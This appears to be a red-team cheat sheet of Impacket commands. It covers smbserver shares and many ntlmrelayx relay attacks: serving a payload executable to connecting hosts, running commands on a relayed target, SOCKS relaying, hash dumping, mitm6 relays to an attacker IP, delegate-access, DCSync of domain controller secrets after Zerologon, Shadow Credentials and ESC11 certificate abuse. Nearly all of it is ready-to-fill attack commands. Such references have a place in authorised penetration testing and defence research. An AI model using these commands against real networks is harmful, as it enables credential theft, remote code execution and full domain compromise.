# Impacket

## smbserver - share smb folder
#plateform/linux #target/serve #port/445 #protocol/smb #cat/ATTACK/LISTEN-SERVE 

A Python implementation of an SMB server. Allows to quickly set up shares and user accounts.

```
impacket-smbserver <shareName> <sharePath>
```

## smbserver - share smb folder with authentication
#plateform/linux #target/serve #port/445 #protocol/smb #cat/ATTACK/LISTEN-SERVE 

```
impacket-smbserver -username <username> -password <password> <shareName> <sharePath>
```

## ntlmrelay - host a payload that will automatically be served to the remote host connecting option 1
#plateform/linux #target/serve #cat/ATTACK/MITM 

```
impacket-ntlmrelayx -tf <targets_file> -smb2support -e <payload_file|payload.exe>
```

## ntlmrelay - host a payload that will automatically be served to the remote host connecting option 2
#plateform/linux #target/serve #cat/ATTACK/MITM 

```
impacket-ntlmrelayx -t <target> -smb2support -e <payload_file|payload.exe>
```

## ntlmrelay - execute command 
```
impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c "<COMMAND>"
```

## ntlmrelay - socks option 1
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
impacket-ntlmrelayx -t <target> -socks -smb2support
```

## ntlmrelay - socks option 2
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
impacket-ntlmrelayx -tf <targets_file> -socks -smb2support
```

## ntlmrelay - authenticate and dump hash option 1
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
impacket-ntlmrelayx -t <target> -smb2support
```

## ntlmrelay - authenticate and dump hash option 2
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
impacket-ntlmrelayx -tf <targets_file> -smb2support
```

## ntlmrelay - to use with mitm6 - relay to target
#plateform/linux #target/serve #cat/ATTACK/MITM 
Next use the socks with proxychains : 
proxychains smbclient //ip/Users -U domain/user

```
impacket-ntlmrelayx -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug
```

## ntlmrelay - to use with mitm6 - delegate access
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
impacket-ntlmrelayx -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access
```

## ntlmrelay - target vulnerable to Zerologon, dump DC's secrets only
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
impacket-ntlmrelayx -t dcsync://'<DOMAINCONTROLLER>'
```

## ntlmrelay - target vulnerable to Zerologon ,dump Domain's secrets
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
impacket-ntlmrelayx -t dcsync://'<DOMAINCONTROLLER>' -auth-smb '<DOMAIN>'/'<LOW_PRIV_USER>':'<PASSWORD>'
```


## ntlmrelay - Shadow Credentials

```
impacket-ntlmrelayx -t ldap://<dc02> --shadow-credentials --shadow-target '<dc01>$'
```

## ntlmrelay - ESC11 
```
impacket-ntlmrelayx -t rpc://$PKI.<domain> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support --template "<Template name>"
```